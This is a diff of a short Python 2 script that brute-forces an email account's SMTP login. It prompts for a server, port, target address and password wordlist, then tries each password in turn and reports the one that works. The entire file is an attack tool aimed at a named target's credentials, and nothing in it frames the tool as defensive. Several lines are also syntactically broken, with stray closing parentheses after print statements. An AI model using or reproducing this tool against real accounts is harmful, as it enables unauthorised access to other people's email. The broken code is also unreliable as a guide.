@@ -2,30 +2,29 @@
 #
 #
 import smtplib
-import os
-import sys
 
-#Imput for smtp server
-#and port
-#
+print "Please enter the smtp server address"
+server = raw_input("> ")
+print "Please enter the smtp server port"
+port = raw_input("> ")
 
-smtpserver = smtplib.SMTP 
+smtpserver = smtplib.SMTP(server, port)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-server = raw_input("enter the smtp server address: ")
-server_port = raw_input("enter server port: ")
+print "Please enter the targets email address.")
+user = raw_input("> ")
 
-user = raw_input("Please Enter One Of The Following:|[User Name]|[Email-Address]|[Cell-Phone-Number]|: ")
-pass_file = raw_input("Please Enter The Path To PassWordLists: ")
+print "Please enter the path to the worldlist.")
+passwfile = raw_input("> ")
 
+passwfile = open(passwfile, "r")
 
-pass_file = open(pass_file, "r")
-
-for password in pass_file:
+for password in passwfile:
 	try:
 		smtpserver.login(user, password)
 
-		print "[+] Password Found: %s" % password
+		print "[+] password found: %s" % password
+		break;
 	except smtplib.SMTPAuthenticationError:
-		print "[!] Password Not Found: %s" % password
+		print "[!] password incorrect: %s" % password
